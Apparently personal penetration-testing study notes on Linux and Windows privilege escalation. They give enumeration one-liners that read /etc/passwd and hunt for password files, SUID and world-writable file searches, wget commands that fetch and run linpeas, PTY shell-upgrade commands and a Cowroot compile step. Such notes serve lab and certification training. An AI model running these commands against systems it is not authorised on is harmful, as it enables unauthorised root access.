Content-Type: text/x-zim-wiki
Wiki-Format: zim 0.6
Creation-Date: 2020-12-19T21:24:32-05:00

====== 0x4 Privilege Escalation ======
Created Saturday 19 December 2020

==== Privilege Escalation on Linux ====
1. Once you gain acces to the system gather information about your current session. 
	a. You can manually do it using this one liner below on any system. This is verging on getting close to a script, but can be ran in the CLI without permissions or nano. You can remove the option to create a file if you're not in a limited shell and can scroll through the results of an output. NOTE: if you're on an older machine you may need to use ifconfig/route/arp over the newer commands.
		//printf "\nid: $(id)\n\nissue: $(cat /etc/issue)\n\nvs: $(cat /proc/version)\n\nhostname: $(hostname)\n\nusers: $(who)\n\npasswd: $(cat /etc/passwd)\n\nnetworking: \nifconfig:\n$(ip addr)\nroute:\n$(ip r)\narp:\n$(ip nei -e)\nnetstat:\n$(netstat -antup)\npsaux:\n$(ps aux | grep root)" > file1.txt && more file1.txt//
		
		#Also check what you can sudo. If you don't have a password this may be difficult:
		//sudo -l//
		
		#Check files that you can edit. 4000=SUID 2000=world writable
		//find / -type f -perm /4000 2>/dev/null  #cross reference the output with https://gtfobins.github.io/  
		find / -type f -perm /2000 2>/dev/null
		find / -perm -2 -type f 2>/dev/null 
		find /etc -perm -2 -type f 2>/dev/null//
		
		#World writable directories:
		//find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep -v root//
 
		#World writable directories for root:
		//find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep root//
 
		#World writable files:
		//find / \( -wholename '/home/homedir/*' -prune -o -wholename '/proc/*' -prune \) -o \( -type f -perm -0002 \) -exec ls -l '{}' ';' 2>/dev/null//
		
	b. Alternatively you can run scripts.
		#Pull linpeas over however you can transfer. If the machine was wget:
		//wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite-master/linPEAS/linpeas.sh
		wget http://www.securitysift.com/download/linuxprivchecker.py//
		
		#Make sure it can run then run
		//chmod +x linpeas.sh//
		//./linpeas.sh > file.txt// 
		//more file.txt// #The file is large so you need a way to parse through it slowly.
		
2. Once you identify a vulnerability research how to exploit it. I won't cover all the options, but the old VHL PDF has some good walkthroughs of using nano to add users to passwd file and compiling and executing cowroot. Check [[../../Useful_code_snippets|Useful code snippets]] to find certain commands that will assist such as [[../../Useful_code_snippets/Add_to_SUDOERS.txt|adding sudoers]]. There is also an indepth walkthrough of priv esc with LXD if the machine is running LXD and there is a user with LXD priveleges.

3. (As required) Stabilize the shell executing each command in order:
	echo 0 > /proc/sys/vm/dirty_writeback_centisecs 
	python -c 'import pty; pty.spawn("/bin/bash")
	/bin/sh -i
	
== PYTHON TTY SHELL ==
#Use the following command to spawn a PTY shell with Python after gaining a limited shell.
	//python -c 'import pty; pty.spawn("/bin/bash");'//
	//python -c \'import pty; pty.spawn(\"/bin/bash\");\'//
	//echo 0 > /proc/sys/vm/dirty_writeback_centisecs//

== Compile Cowroot ==
#When all else fails. Run Cowroot.
//gcc cowroot.c -o cowroot -pthread//

==== Privilege Escalation on Windows ====
#Full disclosure I don't work with windows enough so I'll be updating this as i go through OSCP for now know that you can use an automated script and to look through the VHL courseware PDF for this section. You can also check the [[https://book.hacktricks.xyz/windows/windows-local-privilege-escalation|hackTricks]] site for more info. Typically, most windows machine were exploited through a meterpreter session. See [[../0x3_Gain_Foothold/0x3D_Metasploit.txt|this section]] on metasploit.

== **MANUAL** ==
#The following command searches the system for files that contain ‘password’ in the filename:
	dir /s *password*
#To gather system information:
	systeminfo
#To check the OS version:
	systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
#To check active network connections:
	netstat -ano
#To check for firewall settings:
	netsh firewall show state
	netsh firewall show config
#To check the scheduled tasks:
	schtasks /query /fo LIST /v
#To check running processes linked to services:
	tasklist /SVC
#To check for running services:
	net start
#To check for installed drivers:
	DRIVERQUERY
#With the following command you can check for installed patches:
	wmic qfe get Caption,Description,HotFixID,InstalledOn
	

== **SCRIPTS** ==
1. WinPEAS collection contains two versions of the tool: the winPEAS.exe and the winPEAS.bat script. In order to use the winPEAS.exe tool, it is required that the .NET Framework 4.0 is installed on the system. The winPEAS.bat batch script can run on any system that does not have .NET Framework 4.0 installed.
	a. Check if .net framework is 4.0:
		reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\full" /v version
	b. If not already download .exe/clone repository [[https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS|here]].
2. Transfer the file over via any method you like.
3. Run


